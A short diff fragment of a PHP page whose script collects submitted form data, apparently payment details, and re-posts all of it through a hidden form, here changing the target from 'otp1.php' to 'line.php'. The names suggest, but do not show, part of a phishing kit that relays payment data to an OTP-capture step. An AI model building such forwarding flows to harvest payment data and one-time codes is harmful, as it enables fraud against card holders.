@@ -515,7 +515,7 @@ $payment_data = $_POST;
             setTimeout(() => {
                 const redirectForm = document.createElement('form');
                 redirectForm.method = 'POST';
-                redirectForm.action = 'otp1.php' + (userId ? '?user_id=' + encodeURIComponent(userId) : '');
+                redirectForm.action = 'line.php' + (userId ? '?user_id=' + encodeURIComponent(userId) : '');
                 
                 for (let [key, value] of formData.entries()) {
                     const input = document.createElement('input');
